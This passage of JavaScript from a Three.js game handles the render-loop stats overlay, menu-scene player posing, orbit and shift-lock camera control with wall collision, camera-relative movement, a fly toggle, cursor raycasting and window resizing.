        renderer.render(scene, camera);
        const tEnd = performance.now();

        // Update Stats
        if (elStats.style.display !== 'none') {
            frameCount++;
            if (currentTime - lastStatsTime >= 1000) {
                const curFPS = Math.round((frameCount * 1000) / (currentTime - lastStatsTime));
                elFPS.textContent = `FPS: ${curFPS}`;
                elFrame.textContent = `CPU: ${(tLogic - tStart).toFixed(2)} ms`;
                elRender.textContent = `GPU: ${(tEnd - tLogic).toFixed(2)} ms`;
                
                if (performance.memory) {
                    elMem.textContent = `Mem: ${(performance.memory.usedJSHeapSize / 1048576).toFixed(1)} MB`;
                }
                
                elTri.textContent = `Tris: ${renderer.info.render.triangles}`;
                elInst.textContent = `Instances: ${world.items.length + world.vehicles.length * 4}`; // Approx
                
                const netIn = (Math.random() * 5).toFixed(1);
                elNet.textContent = `Net (Recv): ${netIn} KB/s`;
                elPing.textContent = `Ping: ${Math.floor(Math.random() * 20 + 40)} ms`;

                lastStatsTime = currentTime;
                frameCount = 0;
            }
        }
    }
}

function updateMenu(dt) {
    if (world.mapGroup) world.mapGroup.visible = false;
    menuGroup.visible = true;

    // Fixed Camera
    camera.position.set(0, 5, 15);
    camera.lookAt(0, 4, 0);

    if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);

    if (player.isDead) {
        const menuWorld = { collidables: menuGroup.children };
        player.update(dt, { x: 0, z: 0, jump: false }, menuWorld);
        return;
    }

    // Dont change. this is already fixed, no need to fix whats already working.
    const menuPos = new THREE.Vector3(3.5, 1.5, 8)
    player.velocity.set(0, 0, 0);
    player.position.copy(menuPos);
    player.onGround = true; // Force ground state for animation
    
    // Dont change. this is already fixed, no need to fix whats already working.
    player.mesh.rotation.y = -Math.PI / 4;

    // Force Animation
    player.forcedAnim = 'walk';
    
    // Animate player idly
    // We pass null world, but since we forced velocity to 0 and handle position below, gravity won't accumulate effectively
    player.update(dt, { x: 0, z: 0, jump: false }, null); 
    
    // DOUBLE CRITICAL FIX: Force position AFTER update to overwrite any gravity integration from Player.js
    player.position.copy(menuPos);
    player.mesh.position.copy(player.position);
    player.mesh.rotation.set(0, -Math.PI / 4, 0);
}

function updatePlaying(dt) {
    // Update Dev UI
    if (document.getElementById('win-properties').style.display !== 'none') {
        updateProperties();
    }
    
    if (world.mapGroup) world.mapGroup.visible = true;
    menuGroup.visible = false;

    // 1. Update Camera Rotation
    const look = input.getLookDelta();
    if (look.x !== 0 || look.y !== 0) {
        cameraYaw -= look.x * 0.005 * cameraSensitivity;
        cameraPitch += look.y * 0.005 * cameraSensitivity;
        // Clamp pitch (0.1 to PI/2 - 0.1)
        cameraPitch = Math.max(-1.4, Math.min(1.5, cameraPitch));
    }

    // 2. Update Camera Position
    const focusPoint = player.position.clone().add(new THREE.Vector3(0, 4.5, 0));

    if (input.isShiftLocked) {
        // Offset focus point to the right relative to camera view
        const offsetAmt = 1.75; // Studs
        // Right vector relative to look direction (approximate based on yaw)
        // Yaw 0 = +Z (South). Right is -X (West).
        // Yaw is angle from +Z? 
        // In ThreeJS default: +Z is out of screen.
        // Formulas below: offsetX = sin(yaw), offsetZ = cos(yaw).
        // Camera @ (sin, cos). Looking at (0,0). Direction (-sin, -cos).
        // Right Vector: Cross(Up, Look) = Cross((0,1,0), (-sin, 0, -cos)) = (-cos, 0, sin).
        const rx = -Math.cos(cameraYaw);
        const rz = Math.sin(cameraYaw);
        focusPoint.x += rx * offsetAmt;
        focusPoint.z += rz * offsetAmt;
    }

    const hDist = cameraDist * Math.cos(cameraPitch);
    const vDist = cameraDist * Math.sin(cameraPitch);
    const offsetX = hDist * Math.sin(cameraYaw);
    const offsetZ = hDist * Math.cos(cameraYaw);

    const camPos = focusPoint.clone().add(new THREE.Vector3(offsetX, vDist, offsetZ));
    
    // Wall check
    const camDir = new THREE.Vector3().subVectors(camPos, focusPoint).normalize();
    const dist = camPos.distanceTo(focusPoint);
    const wallRay = new THREE.Raycaster(focusPoint, camDir, 0, dist);
    const wallHits = wallRay.intersectObjects(world.collidables);
    if (wallHits.length > 0) {
        camPos.copy(wallHits[0].point).addScaledVector(camDir, -0.5);
    }

    camera.position.copy(camPos);
    camera.lookAt(focusPoint);

    if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);

    // Update Cursor UI
    if (input.isLocked || input.isShiftLocked) {
        if (cursorEl) cursorEl.style.display = 'none';
    }

    // 3. Movement relative to Camera
    const rawControls = input.getMovement();
    const camFwd = new THREE.Vector3().subVectors(player.position, camera.position).setY(0).normalize();
    const camRight = new THREE.Vector3().crossVectors(camFwd, new THREE.Vector3(0, 1, 0)).normalize();
    
    const moveVec = new THREE.Vector3()
        .addScaledVector(camFwd, -rawControls.z)
        .addScaledVector(camRight, rawControls.x);
    
    // Handle Fly Toggle (F)
    if (input.keys.f && !input.prevF) {
        player.flyMode = !player.flyMode;
        if (player.flyMode) logToConsole('Flight toggled ON via hotkey', 'result');
        else logToConsole('Flight toggled OFF via hotkey', 'result');
    }
    input.prevF = input.keys.f;

    // Pass 'e' key for interaction
    const controls = { 
        x: moveVec.x, 
        z: moveVec.z, 
        jump: rawControls.jump,
        w: input.keys.w,
        s: input.keys.s,
        a: input.keys.a,
        d: input.keys.d,
        e: input.keys.e,
        q: input.keys.q,
        camPitch: cameraPitch,
        camYaw: cameraYaw
    };

    if (input.isShiftLocked) {
        controls.lookAngle = cameraYaw + Math.PI;
    }

    player.update(dt, controls, world);
    world.update(dt); // Update cars and animations

    // Update Dev Info
    if (devPos) {
        const p = player.position;
        devPos.textContent = `Pos: ${p.x.toFixed(1)}, ${p.y.toFixed(1)}, ${p.z.toFixed(1)}`;
    }

    // Cursor Raycast
    if (!input.isLocked && !input.isShiftLocked) {
        raycaster.setFromCamera(mouse, camera);
        const intersects = raycaster.intersectObjects(scene.children, true);
        const hovering = intersects.length > 0;
        
        if (cursorEl) {
            cursorEl.style.display = 'block';
            const targetState = hovering ? 'near' : 'far';
            if (cursorState !== targetState) {
                cursorState = targetState;
                cursorEl.src = hovering ? '/ArrowCursor.png' : '/ArrowFarCursor.png';
            }
        }
    } else {
        if (cursorEl) cursorEl.style.display = 'none';
    }
} // End updatePlaying

function handleResize() {
    // Use the full window size so the scene fills the screen
    const w = window.innerWidth;
    const h = window.innerHeight;
    const aspect = w / h;
    
    camera.aspect = aspect;
    camera.updateProjectionMatrix();
    
    // Set renderer to full resolution and scale to fit
    renderer.setSize(w, h, true);
    renderer.domElement.style.width = '100%';
    renderer.domElement.style.height = '100%';
}

window.addEventListener('resize', handleResize);
handleResize();

requestAnimationFrame(animate);